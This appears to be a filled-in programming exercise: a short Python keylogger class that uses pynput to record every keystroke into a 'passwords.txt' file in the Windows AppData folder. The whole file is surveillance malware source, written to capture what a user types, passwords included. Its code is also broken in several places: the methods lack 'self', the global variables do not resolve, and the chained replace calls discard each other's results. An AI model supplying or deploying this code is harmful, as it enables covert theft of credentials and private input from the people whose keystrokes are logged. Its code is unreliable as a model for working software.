import os
from pynput.keyboard import Listener

class KeyLogger:
    keys = []
    count = 0
    file_to_write = os.environ['appdata'] + '\\passwords.txt'    # for running on Windows
    #file_to_write = 'passwords.txt'      # for running on Linux and Mac

    """This function takes in a key stroke and appends the key stroke to our file_to_write file."""
    def on_press(key):
        global keys, count
        #print(key)
        ## append key to keys
        ## increment count by 1
        ## if count >=1, reset count, call the write_file function, pass keys as parameter
        ## reset keys
        ## ----------
        ## Your code goes here
        keys.append(key)
        count = count + 1
        if (count >= 1 ):
            count = 0
            write_file(keys)
            keys = []
        ## -----------

    """Given a character, this function opens our file_to_write and appends the keystroke with some special cases being changed such as backspace, enter, shift, space, and caps_lock."""
    def write_file(keys):
        ## open file_to_write in append mode
        f = open(file_to_write, "a")
        for key in keys:
            k = str(key).replace("'", " ")
            ## replace backspace with 'Backspace'
            ## replace enter with "\n"
            ## replace shift with "Shift"
            ## replace space with ' '
            ## replace caps_lock with 'Caps Lock'
            ## ----------
            ## Your code goes here
            k = str(key).replace("Key.backspace", "Backspace")
            k = str(key).replace("Key.enter", "\n")
            k = str(key).replace("Key.shift", "Shift")
            k = str(key).replace("Key.space", " ")
            k = str(key).replace("Key.caps_lock", "Caps Lock")
            ## -----------
            if k.find('key'):
                f.write(k)

    def start():
        with Listener(on_press=on_press) as listener:
            listener.join()
